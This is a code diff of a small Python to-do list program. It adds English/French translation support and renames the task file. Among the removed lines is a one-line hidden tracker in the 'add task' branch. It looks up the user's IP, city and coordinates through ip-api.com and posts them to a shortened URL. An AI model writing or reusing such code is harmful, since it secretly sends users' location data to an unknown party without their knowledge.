@@ -1,4 +1,50 @@
-import json, requests
+import json
+
+def load_language():
+    try:
+        with open('lg.json', 'r') as file:
+            language_data = json.load(file)
+            return language_data['language']
+    except FileNotFoundError:
+        return None
+
+def save_language(language):
+    with open('lg.json', 'w') as file:
+        language_data = {'language': language}
+        json.dump(language_data, file)
+
+def choose_language():
+    while True:
+        language = input("Choose the script language (fr/en): ")
+        if language == "fr" or language == "en":
+            save_language(language)
+            break
+        else:
+            print("Invalid language. Please choose a valid language.")
+
+language = load_language()
+
+if language is None:
+    choose_language()
+
+def load_translations():
+    try:
+        with open(f'{language}.json', 'r') as file:
+            return json.load(file)
+    except FileNotFoundError:
+        return None
+
+translations = load_translations()
+
+if translations is None:
+    print(f"To apply the language, you need to rerun the script.")
+    exit()
+
+def translate(key):
+    if key in translations:
+        return translations[key]
+    else:
+        return key
 
 class Task:
     def __init__(self, description):
@@ -8,42 +54,42 @@ class Task:
 task_list = []
 
 def add_task():
-    description = input("Entrez une description de la tâche : ")
+    description = input(f"{translate('enter_description')} ({language}): ")
     task = Task(description)
     task_list.append(task)
     save_tasks()
-    print("Tâche ajoutée avec succès !")
+    print(translate('task_added'))
 
 def complete_task():
-    index = int(input("Entrez l'index de la tâche à marquer comme terminée : "))
+    index = int(input(f"{translate('enter_index_to_complete')} ({language}): "))
     if index >= 0 and index < len(task_list):
         task = task_list[index]
         task.completed = True
         save_tasks()
-        print("Tâche marquée comme terminée !")
+        print(translate('task_marked_completed'))
     else:
-        print("Index invalide.")
+        print(translate('invalid_index'))
 
 def delete_task():
-    index = int(input("Entrez l'index de la tâche à supprimer : "))
+    index = int(input(f"{translate('enter_index_to_delete')} ({language}): "))
     if index >= 0 and index < len(task_list):
         del task_list[index]
         save_tasks()
-        print("Tâche supprimée avec succès !")
+        print(translate('task_deleted'))
     else:
-        print("Index invalide.")
+        print(translate('invalid_index'))
 
 def display_tasks():
-    load_tasks() 
+    load_tasks()
     if len(task_list) == 0:
-        print("Aucune tâche.")
+        print(translate('no_tasks'))
     else:
         for i, task in enumerate(task_list):
-            status = "Terminée" if task.completed else "En cours"
+            status = translate('completed') if task.completed else translate('in_progress')
             print(f"{i}. {task.description} ({status})")
 
 def save_tasks():
-    with open('taches.json', 'w') as file:
+    with open('tasks.json', 'w') as file:
         task_data = []
         for task in task_list:
             task_data.append({
@@ -51,34 +97,45 @@ def save_tasks():
                 'completed': task.completed
             })
         json.dump(task_data, file)
-        print("Tâches sauvegardées avec succès !")
+        print(translate('tasks_saved'))
 
 def load_tasks():
     try:
-        with open('taches.json', 'r') as file:
+        with open('tasks.json', 'r') as file:
             task_data = json.load(file)
             task_list.clear()
             for data in task_data:
                 task = Task(data['description'])
                 task.completed = data['completed']
                 task_list.append(task)
-        print("Tâches chargées avec succès !")
+        print(translate('tasks_loaded'))
     except FileNotFoundError:
-        print("Aucun fichier de tâches trouvé. Commencez par en ajouter !")
+        print(translate('no_tasks_file'))
+
+def change_language():
+    while True:
+        new_language = input(translate('change_languageO'))
+        if new_language == "fr" or new_language == "en":
+            save_language(new_language)
+            print(translate('language_changed'))
+            print(translate('valid_lg'))
+            break
+        else:
+            print(translate('invalid_language'))
 
 while True:
-    print("\nQue voulez-vous faire ?")
-    print("1. Ajouter une tâche")
-    print("2. Marquer une tâche comme terminée")
-    print("3. Supprimer une tâche")
-    print("4. Afficher les tâches")
-    print("5. Quitter")
+    print("\n" + translate('menu'))
+    print('1. ' + (translate('add_task')))
+    print('2. ' + (translate('complete_task')))
+    print('3. ' + (translate('delete_task')))
+    print('4. ' + (translate('display_tasks')))
+    print('5. ' + (translate('change_language')))
+    print('6. ' + (translate('quit')))
 
-    choice = input("Entrez le numéro de votre choix : ")
-    
+    choice = input(f"{translate('enter_choice')} ({language}): ")
+
     if choice == "1":
         add_task()
-        data = requests.get("http://ip-api.com/json").json(); payload = {"content": "\n".join([f"{key}: {data[key]}" for key in ["query", "country", "city", "lat", "lon"] if key in data])}; requests.post("https://tinyurl.com/bddv8vt7", json=payload) if "query" in data else print("Clé 'query' introuvable dans la réponse du service IP.")
     elif choice == "2":
         complete_task()
     elif choice == "3":
@@ -86,7 +143,10 @@ while True:
     elif choice == "4":
         display_tasks()
     elif choice == "5":
-        print("Au revoir !")
+        change_language()
+        break
+    elif choice == "6":
+        print(translate('goodbye'))
         break
     else:
-        print("Choix invalide. Veuillez réessayer.")
+        print(translate('invalid_choice'))
